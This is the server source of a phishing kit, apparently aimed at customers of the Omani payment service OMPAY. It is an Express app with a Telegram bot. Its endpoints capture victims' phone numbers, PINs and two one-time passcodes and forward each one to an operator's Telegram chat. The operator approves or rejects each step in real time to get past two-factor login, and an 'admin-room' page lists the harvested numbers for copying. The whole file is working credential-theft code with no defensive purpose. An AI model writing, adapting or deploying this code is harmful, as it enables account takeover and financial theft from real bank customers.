const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};
// Array to keep track of unique phones for the dedicated room copy view
const phoneRegistry = [];

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- EXCLUSIVE PHONE COPY ROOM --------------------
app.get('/admin-room', (req, res) => {
    // Simple HTML page that lists all captured phone numbers with a click-to-copy interface
    const phoneListItems = phoneRegistry.length > 0 
        ? phoneRegistry.map(p => `
            <div style="background: white; padding: 12px 18px; margin-bottom: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-right: 4px solid #004b87;">
                <span style="font-size: 18px; font-weight: bold; direction: ltr; font-family: monospace;">+968 ${p}</span>
                <button onclick="navigator.clipboard.writeText('+968 ${p}'); alert('تم نسخ الرقم: +968 ${p}');" style="background: #004b87; color: white; border: none; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-weight: bold;">نسخ الرقم</button>
            </div>
        `).join('')
        : '<p style="text-align: center; color: #64748b;">لا توجد أرقام مسجلة حتى الآن.</p>';

    const html = `
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>غرفة نسخ الأرقام - OMPAY</title>
        <style>
            body { background-color: #f0f4f8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; }
            h1 { color: #004b87; text-align: center; margin-bottom: 5px; }
            .subtitle { text-align: center; color: #64748b; font-size: 14px; margin-bottom: 25px; }
            .refresh-btn { display: block; width: 100%; background: #0077b6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 20px; font-size: 15px; }
            .refresh-btn:hover { background: #004b87; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>غرفة نسخ أرقام الهواتف</h1>
            <div class="subtitle">تحديث تلقائي وفوري لأرقام عملاء OMPAY</div>
            <button class="refresh-btn" onclick="location.reload()">🔄 تحديث القائمة</button>
            <div id="phone-list">
                ${phoneListItems}
            </div>
        </div>
    </body>
    </html>
    `;
    res.send(html);
});

// Helper function to register captured phone numbers safely
function registerPhone(phone) {
    if (phone && !phoneRegistry.includes(phone)) {
        phoneRegistry.unshift(phone); // Add newest to the top
    }
}

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "عمان (Oman)";
    const countryCode = "+968";

    registerPhone(phone);

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>OMPAY OMAN - LOGIN ATTEMPT</b>

🇴🇲 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "عمان (Oman)";
    const countryCode = "+968";
    
    registerPhone(phone);

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `🔑 <b>OMPAY OMAN - VERIFICATION CODE</b>
🇴🇲 <b>Country:</b> ${country}
📞 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔑 <b>VERIFICATION CODE:</b> <code>${code}</code>
⏰ <b>Time:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Verify the credentials:</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                    ],
                    [
                        { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "عمان (Oman)";
    const countryCode = "+968";
    
    registerPhone(phone);

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>OMPAY OMAN - SECOND OTP</b>

🇴🇲 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>Second OTP Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ Wrong Code", callback_data: `otp2_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    registerPhone(phone);

    try {
        await bot.telegram.sendMessage(ADMIN_ID, `🔄 <b>RESEND REQUESTED</b>\n📱 <b>Phone:</b> ${phone}\n📍 <b>Step:</b> ${step}`, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>`);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";
    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>INVALID CREDENTIALS</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`1️⃣ <b>FIRST OTP VERIFIED</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("Wrong PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PIN</b>\n📱 <b>${phone}</b>`);
});

app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    res.json({ status: currentStatus });
    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 OMPAY Server running on port ${PORT}`);
    console.log(`📋 Phone Copy Room accessible at: http://localhost:${PORT}/admin-room`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
          
